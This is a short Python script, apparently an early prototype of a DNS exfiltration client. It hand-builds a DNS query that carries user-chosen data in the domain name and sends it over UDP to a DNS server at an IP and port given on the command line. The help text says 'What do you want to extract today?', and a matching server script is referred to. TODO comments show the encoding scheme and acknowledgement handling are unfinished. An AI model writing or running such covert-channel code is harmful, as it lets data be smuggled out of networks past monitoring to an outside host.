import struct
import socket
import argparse

#@author Patrick Mathieu / @pathetiq
# This code is an update from: 
# DNS packet struct packet taken from: http://stackoverflow.com/questions/24814044/having-trouble-building-a-dns-packet-in-python 
# User: http://stackoverflow.com/users/3850901/monkeyba
#

class DnsPacketBuilder:
        def __init__(self):
                pass

        def build_packet(self, url):
                packet = struct.pack(">H", 12049)  # Query Ids (Just 1 for now)
                packet += struct.pack(">H", 256)  # Flags
                packet += struct.pack(">H", 1)  # Questions
                packet += struct.pack(">H", 0)  # Answers
                packet += struct.pack(">H", 0)  # Authorities
                packet += struct.pack(">H", 0)  # Additional
                
		#@TODO all message should be in the form of a IP address with padding and translation to 1 to 255
                split_url = url.decode('utf-8').split(".")
                for part in split_url:
                        parts = part.encode('utf-8')
                        packet += struct.pack("B", len(part))
                        for byte in part:
                            packet += struct.pack("c", byte.encode('utf-8'))
                
                packet += struct.pack("B", 0)  # End of String
                packet += struct.pack(">H", 1)  # Query Type
                packet += struct.pack(">H", 1)  # Query Class
                return packet

   
def main():
    parser = argparse.ArgumentParser(description='Process args.')
    parser.add_argument('-t','--dns', help='DNS server IP address')
    parser.add_argument('-p','--port', help='DNS server port')
    parser.add_argument('-d','--data', help='What do you want to extract today?')
    args = parser.parse_args()
    dns_ip = args.dns.encode('utf-8')
    dns_port = args.port.encode('utf-8')
    data = args.data.encode('utf-8')

    # Sending the following
    print("Sending: "+str(data))

    #dnspacket object
    builder = DnsPacketBuilder()

    #build the data to send          
    #@todo : transform the data in ascii decimal and split it like an IP address
    #        Add a starting and ending pattern for each message
    #        1 Message can be splitted in multiple dns queries

    print("Sending packet")
    packet = builder.build_packet(data)

	
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', 8888))
    sock.settimeout(2)
    sock.sendto(bytes(packet), (dns_ip, int(dns_port)))

    print("Packet Sent")


    #@TODO fake a real response in the dns_server.py and print it here (acknowledge)
    #get response
    #data, addr = sock.recvfrom(1024)
    #print("Response: " + data)
    sock.close()

if __name__ == "__main__":
    main()
